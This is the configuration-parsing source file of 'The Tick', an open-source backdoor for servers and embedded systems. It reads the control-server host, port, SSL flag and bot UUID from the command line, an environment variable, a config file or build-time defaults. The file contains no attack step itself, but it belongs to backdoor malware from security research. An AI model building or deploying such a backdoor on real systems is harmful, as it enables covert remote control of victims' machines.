/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#include "config.h"
#include "base64.h"

// Nifty macro trick to expand using quotes.
// https://stackoverflow.com/a/3419392/426293
#define _Q(x) #x
#define QUOTE(x) _Q(x)

/****************************************************************************/

#if TICK_CONFIG_USE_ARGV || TICK_CONFIG_USE_ENV || TICK_CONFIG_USE_FILE

// Pointer to option handler function.
typedef int (*OptionHandler)(char *input, void *output, size_t size);

// Option definition structure.
typedef struct {
    char *name;             // Name of the option (without dashes).
    size_t offset;          // Offset of the Settings struct member.
    size_t size;            // Size of the Settings struct member.
    OptionHandler handler;  // Handler function to parse the value.
} Option;

// Option handler function for all supported types.
int _option_str(char *input, void *output, size_t size)
{
    strncpy(output, input, size);
    return 0;
}
int _option_int(char *input, void *output, size_t size)
{
    if (size != sizeof(int)) return -1;
    *((int *)(output)) = atoi(input);
    return 0;
}
int _option_bool(char *input, void *output, size_t size)
{
    if (size != sizeof(int)) return -1;
    int i = atoi(input);
    if (i != 0) i = 1;
    *((int *)(output)) = i;
    return 0;
}
int _option_base64(char *input, void *output, size_t size)
{
    if (size < 5) return -1;
    size_t length = base64_decode(input, output, size - 1);
    if (length == 0) return -1;
    *((char *)(output) + length) = 0;
    return 0;
}

// Aliases for the functions above.
#define OPTION_STRING _option_str
#define OPTION_NUMBER _option_int
#define OPTION_FLAG   _option_bool
#define OPTION_BLOB   _option_base64

// Macro to populate the Options structure more easily.
#define DEFINE_OPTION(name, member, handler) { name, offsetof(Settings, member), sizeof(((Settings*)0)->member), handler }

// Status Options structure with the supported options that will be parsed.
// Every option works as a positional argument based on the index of this table.
static const Option options_table[] = {
    DEFINE_OPTION("host",       hostname,   OPTION_STRING),
    DEFINE_OPTION("port",       port,       OPTION_NUMBER),
    DEFINE_OPTION("ssl",        use_ssl,    OPTION_FLAG),
    DEFINE_OPTION("uuid",       uuid,       OPTION_STRING),
};
static const int options_count = sizeof(options_table) / sizeof(options_table[0]);

// Find an option by short name (the first character).
// Returns an index into options_table[] or -1 if not found.
int find_short_option(char c)
{
    int i;
    for (i = 0; i < options_count; i++) {
        if (c == options_table[i].name[0]) {
            return i;
        }
    }
    return -1;
}

// Find an option by full name.
// Returns an index into options_table[] or -1 if not found.
int find_long_option(char *option)
{
    int i;
    for (i = 0; i < options_count; i++) {
        if (strcmp(option, options_table[i].name) == 0) {
            return i;
        }
    }
    return -1;
}

// Parse a single option value directly into the Settings structure.
// Returns 0 on success or -1 on failure.
int parse_option(Settings *s, int option_index, char *input)
{
    OptionHandler handler = options_table[option_index].handler;
    void *output = ((char *)s + options_table[option_index].offset);
    size_t size = options_table[option_index].size;
    return (*handler)(input, output, size);
}

// Parse the command line options directly into the Settings structure.
// This function will try its best to parse even if there are errors,
// but still returns 0 on success or -1 on failure.
int parse_command_line(Settings *s, int argc, char *argv[], int skip_first)
{
    int success = 0;
    int option_index;
    int pos = 0;
    int final = 0;
    int first = skip_first ? 1 : 0;

    // Trivial case.
    if (argc <= first) {
        return 0;
    }

    // Loop for every command line argument except the first.
    // The first argument is assumed to be the executable.
    int i;
    for (i = first; i < argc; i++) {
        option_index = -1;

        // Determine if it's a short option, a long option, or a positional.
        // Then find the option in options_table and set option_index.
        if (!final && argv[i][0] == '-') {
            if (argv[i][1] == '-') {
                if (argv[i][2] == 0) {

                    // It's a "--" on its own.
                    // This turns off option parsing,
                    // leaving only positional arguments.
                    final = 1;
                    continue;

                }

                // It's a long option.
                option_index = find_long_option(&argv[i][2]);
                i++;

            } else if (argv[i][2] == 0) {

                // It's a short option.
                option_index = find_short_option(argv[i][1]);
                i++;

            }
        } else {

            // It's a positional.
            if (pos >= options_count) {
                success = -1;
                continue;
            }
            option_index = pos;
            pos++;

        }
        if (option_index < 0) {
            success = -1;
            continue;
        }
        if (i == argc) break;

        // Parse the option.
        if (parse_option(s, option_index, argv[i]) < 0) {
            return -1;
        }
    }

    // Return 0 on success, -1 on failure.
    return success;
}

#if TICK_CONFIG_USE_ENV || TICK_CONFIG_USE_FILE

// Tokenize the given string in place and place pointers to each argument
// in the given array. If NULL is passed instead of an array, the function
// merely counts the number of tokens instead without modifying anything.
// That way by calling the function twice you can measure the size of the
// array, then allocate and populate it.
int split_command_line(char *cmdline, char *argv[])
{
    int count = 0;
    char *token = NULL;
    char current = 0;
    char quote = 0;

    // Prevent crashes if we call this function wrong.
    if (cmdline == NULL) return 0;

    // Loop until the command line string is over.
    while ((current = *cmdline) != 0) {

        // If we have not yet found a token...
        if (token == NULL) {

            // If we have a quote character, we have a quoted token.
            if (current == '"' || current == '\'') {
                quote = current;
                token = cmdline + 1;

            // If we have a backslash...
            } else if (current == '\\') {
                if (argv != NULL) {
                    strcpy(cmdline, cmdline + 1);
                }

                // If the backslash was escaping whitespace, skip it.
                // If not, we have an unquoted token, because a backslash
                // before a quote character makes it a literal.
                current = *cmdline;
                if (current == 0) break;
                if (
                    current != ' ' && current != '\t' &&
                    current != '\r' && current != '\n')
                {
                    token = cmdline;
                }

            // If we have a non whitespace, we have an unquoted token.
            } else if (
                    current != ' ' && current != '\t' &&
                    current != '\r' && current != '\n')
            {
                token = cmdline;
            }

        // If we're in a token...
        } else {

            // If we have a backslash, skip it.
            if (current == '\\') {
                if (argv != NULL) {
                    strcpy(cmdline, cmdline + 1);
                }
                cmdline++;

            // Is it a quoted token?
            } else if (quote != 0) {

                // If we found the closing quote, end the token.
                if (current == quote) {
                    quote = 0;
                    if (argv != NULL) {
                        *cmdline = 0;
                        argv[count] = token;
                    }
                    token = NULL;
                    count++;
                }

            // Is it an unquoted token?
            } else {

                // If we found whitespace, end the token.
                if (
                        current == ' ' || current == '\t' ||
                        current == '\r' || current == '\n')
                {
                    if (argv != NULL) {
                        *cmdline = 0;
                        argv[count] = token;
                    }
                    token = NULL;
                    count++;
                }
            }
        }

        // Next character.
        cmdline++;
    }

    // If we broke out of the loop and there was still a token queued,
    // count it and add it to the array.
    if (token != NULL) {
        if (argv != NULL) {
            *cmdline = 0;
            argv[count] = token;
        }
        count++;
    }

    // Return the count of tokens.
    return count;
}

#if TICK_CONFIG_USE_ENV

// Parse command line arguments passed via the environment.
int parse_environment(Settings *s)
{
    char *env = getenv(QUOTE(TICK_CONFIG_ENV_NAME));
    if (env != NULL) {
        int argc = split_command_line(env, NULL);
        if (argc > 0) {
            char *argv[argc];
            memset(argv, 0, sizeof(argv));
            split_command_line(env, argv);
            return parse_command_line(s, argc, argv, 0);
        }
    }
    return 0;
}

#endif
#if TICK_CONFIG_USE_FILE

// Parse command line arguments passed via a file.
int parse_config_file(Settings *s, char *filename)
{
    int success = 0;
    char buffer[TICK_MAX_CONFIG_FILE_SIZE];

    // Read the entire contents of the file into memory.
    // If the file cannot be opened, abort.
    // If the file is too large, it will be silently truncated.
    LOG("Using configuration file: %s\n", filename);
    int fd = open(filename, O_RDONLY | O_SEQUENTIAL);
    if (fd < 0) {
        LOG("Error opening config file!\n");
        return -1;
    }
    memset(buffer, 0, sizeof(buffer));
    ssize_t remaining = sizeof(buffer) - 1;     // null terminated
    ssize_t chunk = -1;
    char *ptr = buffer;
    while (remaining > 0) {
        chunk = read(fd, ptr, remaining);
        if (chunk == 0) break;
        if (chunk < 0) {
            success = -1;
            break;
        }
        ptr = ptr + chunk;
        remaining = remaining - chunk;
    }
    close(fd);
    fd = -1;

    // Parse the configuration file.
    int argc = split_command_line(buffer, NULL);
    if (argc > 0) {
        char *argv[argc];
        memset(argv, 0, sizeof(argv));
        split_command_line(buffer, argv);
        success |= parse_command_line(s, argc, argv, 0);
    }

    // We're done!
    return success;
}

#endif
#endif
#endif

/****************************************************************************/

#if TICK_CONFIG_USE_ARGV
void get_configuration(Settings *s, int argc, char *argv[])
#else
void get_configuration(Settings *s)
#endif
{
    // Zero out the memory structure for the settings.
    // We need this because not all values will be set by the code below.
    memset(s, 0, sizeof(Settings));

    // Now initialize again to the default values.
    // These can be controlled at compile time from the makefile.
    // Useful for situations where you can't find a way to pass the
    // configuration to the bot, so you just make a custom build.
#ifdef TICK_CONFIG_HOSTNAME
    strncpy(s->hostname, QUOTE(TICK_CONFIG_HOSTNAME), sizeof(s->hostname));
#endif
#ifdef TICK_CONFIG_PORT
    s->port = TICK_CONFIG_PORT;
#endif
#if TICK_FEATURES_CRYPTO
#ifdef TICK_CONFIG_USE_SSL
    s->use_ssl = TICK_CONFIG_USE_SSL;
#endif
#endif

    // If configuration file parsing is enabled, do it now.
#if TICK_CONFIG_USE_FILE
    if (parse_config_file(s, QUOTE(TICK_CONFIG_FILE_NAME)) < 0) {
        LOG("Error parsing configuration file! Continuing regardless...\n");
    }
#endif

    // If environment variable parsing is enabled, do it now.
#if TICK_CONFIG_USE_ENV
    if (parse_environment(s) < 0) {
        LOG("Error parsing environment variable! Continuing regardless...\n");
    }
#endif

    // If argv parsing is enabled, do it now.
#if TICK_CONFIG_USE_ARGV
    if (parse_command_line(s, argc, argv, 1) < 0) {
        LOG("Error parsing command line! Continuing regardless...\n");
    }
#endif

}
